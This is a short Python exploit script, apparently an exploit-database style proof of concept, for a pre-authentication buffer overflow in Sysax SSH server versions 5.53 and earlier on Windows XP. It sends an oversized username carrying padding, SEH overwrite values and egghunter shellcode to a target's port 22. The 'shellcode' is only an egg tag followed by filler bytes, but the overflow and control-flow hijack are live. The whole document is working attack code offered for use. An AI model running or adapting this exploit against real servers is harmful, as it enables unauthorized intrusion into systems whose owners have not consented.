#!/usr/bin/python
##########################################################################################################
#Title: Sysax <= 5.53 SSH Username BoF Pre Auth RCE (Egghunter)
#Author: Rio Atmadja
#OS Tested: XP SP3 32bit
##########################################################################################################
import paramiko,os,sys
if len(sys.argv) != 2:
    print "[+] Usage: ./filename <Target IP>"
    sys.exit(1)
host = sys.argv[1]

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

shellcode = ( "w00tw00t" + '\x43' * 500 )
nseh = "\xeb\x80\x90\x90" 
seh = "\x87\xfa\x49\x00" # 0x0049fa87 (C:\Program Files\SysaxServer\sysaxservd.exe)

payload  = '\x41' * ( 9204 - len(shellcode) ) + shellcode  + nseh + seh + egghunter 

print "============================================================================"
print "                 Sysax <= 5.53 SSH Username BoF Pre Auth RCE                "
print "                                  by orion                                  "
print "============================================================================"
print "[+] Connecting to %s on port %d" % (host,22)
print "[+] Sending Evil payload --> " + str(len(payload)) + " Bytes"

try:
	transport = paramiko.Transport((host, 22))	
except:
	print "[X] Unable to connect to " + host + " on port " + str(22)
	sys.exit(1)
transport = paramiko.Transport((host, 22))
print "[+] Launching exploit against " + host + " on port " + str(22)
#print "[+] Sending Evil Username --> " + str(len(payload)) + " Bytes"
#print "[+] Done!"
transport.connect(username = payload , password = "pwnag3")	
transport.close()
raw_input("[+] Press any key to exit\n")

